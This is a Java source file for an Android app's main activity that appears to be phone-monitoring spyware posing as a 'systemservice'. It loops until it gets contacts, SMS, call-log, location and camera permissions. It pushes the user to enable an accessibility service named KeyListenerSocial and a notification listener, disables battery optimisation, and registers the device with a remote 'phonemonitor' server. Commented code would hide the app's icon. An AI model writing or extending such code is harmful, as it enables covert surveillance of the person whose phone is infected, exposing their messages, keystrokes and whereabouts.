package com.example.systemservice;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.StrictMode;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import com.example.systemservice.helper.CheckNetworkStatus;
import com.example.systemservice.helper.HttpJsonParser;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.CookiePolicy;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.ExecutionException;

public class MainActivity extends AppCompatActivity {
    //Permessi da richiedere all'utente
    public static final int PERMISSION_ALL = 1;
    public static String[] PERMISSIONS =
            {
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.CALL_PHONE,
                    Manifest.permission.INTERNET,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.ACCESS_WIFI_STATE,

            };
    //Intent per battery saver
    private static final Intent[] POWERMANAGER_INTENTS = {
            new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
            new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            new Intent().setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            new Intent().setComponent(new ComponentName("com.htc.pitroad", "com.htc.pitroad.landingpage.activity.LandingPageActivity")),
            new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.MainActivity"))
    };
    //Intent per MainService
    Intent mServiceIntent;
    private MainService mSensorService;
    Context ctx;

    public Context getCtx() {
        return ctx;
    }

    //PER CONNESSIONE
    private static final String KEY_RESPONSE = "response";
    private static final String KEY_UTENTE = "idUtente";
    private static final String KEY_NOME_UTENTE = "nomeUtente";
    private static final String KEY_SISTEMA_OPERATIVO = "sistemaOperativo";
    private static String insertUrl = "http://phonemonitor.altervista.org/php/BE/aggiungiDispositivo.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //Chiedo i permessi all'utente
        while (!hasPermission(MainActivity.this))
            requestPermissions(MainActivity.this);
        //Chiedo i permessi di sistema
        //Per disabilitare l'ottimizzazione della batteria e il boot
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }

        //Per accesso a eventi
        if (!isAccessibilityServiceEnabled(this, KeyListenerSocial.class)) {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            while (!isAccessibilityServiceEnabled(this, KeyListenerSocial.class)) ;
        }
        Log.d("++++", "Permesso accessibilità passato");

        //Per accesso alle notifiche
        if (!checkNotification(this)) {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            while (!checkNotification(this)) ;
        }
        Log.d("++++", "Permesso notifiche passato");


        /*
        //Per aggiungere app al boot
        for (Intent intent : POWERMANAGER_INTENTS) {
            if (getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                try {
                    startActivity(intent);
                    break;
                } catch (Exception ex) {
                    Log.d("Ciclo", "Avanti");
                }
            }
        }
        */

        //Nascondo app avvio service
        //Per nascondere GUI INSERIRE QUESTO CODICE XML NEL MANIFEST DEL MAIN ACTIVITY:
        //android:theme="@style/Theme.AppCompat.Transparent.NoActionBar">
        //getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        //nascondiApplicazione(this);

        //Registro app sul database
        registerApp(this);

        //Starto il MainService
        ctx = this;
        mSensorService = new MainService(getCtx());
        mServiceIntent = new Intent(getCtx(), mSensorService.getClass());
        if (!isMyServiceRunning(mSensorService.getClass())) {
            startService(mServiceIntent);
        }
        stopService(mServiceIntent);
        finish();

    }

    //PERMESSI
    private static boolean hasPermission(Activity MainActivity) {
        if (MainActivity != null && PERMISSIONS != null)
            for (String permission : PERMISSIONS) {
                if (ActivityCompat.checkSelfPermission(MainActivity, permission) != PackageManager.PERMISSION_GRANTED)
                    return false;
            }
        return true;
    }

    private static void requestPermissions(Activity MainActivity) {
        ActivityCompat.requestPermissions(MainActivity, PERMISSIONS, PERMISSION_ALL);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_ALL) {
            for (int i = 0; i < PERMISSIONS.length; i++) {
                String permission = PERMISSIONS[i];
                int grantResult = grantResults[i];
                if (permission.equals(PERMISSIONS))
                    if (grantResult != PackageManager.PERMISSION_GRANTED)
                        hasPermission(MainActivity.this);
            }
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);

        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null)
            return false;

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);

        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);

            if (enabledService != null && enabledService.equals(expectedComponentName))
                return true;
        }

        return false;
    }

    public static boolean checkNotification(Context context) {
        ComponentName cn = new ComponentName(context, NotificationReceiver.class);
        String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        final boolean enabled = flat != null && flat.contains(cn.flattenToString());
        return enabled;
    }

    //PER MAIN SERVICE
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("isMyServiceRunning?", true + "");
                return true;
            }
        }
        Log.i("isMyServiceRunning?", false + "");
        return false;
    }


    @Override
    protected void onDestroy() {
        stopService(mServiceIntent);
        Log.i("MAINACT", "onDestroy!");
        super.onDestroy();

    }

    private static void nascondiApplicazione(Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private static void registerApp(Context context) {
        HttpPostRequest postRequest = new HttpPostRequest();
        String result = null;
        JSONObject reader = null;
        int idDispositivo = -1;
        String esito = null;
        do {
            try {
                reader = new JSONObject(postRequest.execute(insertUrl, "3", "idUtente", "10", "sistemaOperativo", "Android", "nomeUtente", "OMAR-TELEFONO").get());
                esito = reader.getString("esito");
                idDispositivo = Integer.parseInt(reader.getString("idDispositivo"));

            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        while (idDispositivo == -1);
        Log.d("++++", "esito: " + esito + " idDispositivo: " + idDispositivo);
        //Salvo nelle SharedPreferences
        SharedPreferences sharedPref = context.getSharedPreferences("FILE", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        editor.putInt("idDispositivo", idDispositivo);
        editor.commit();
    }
}
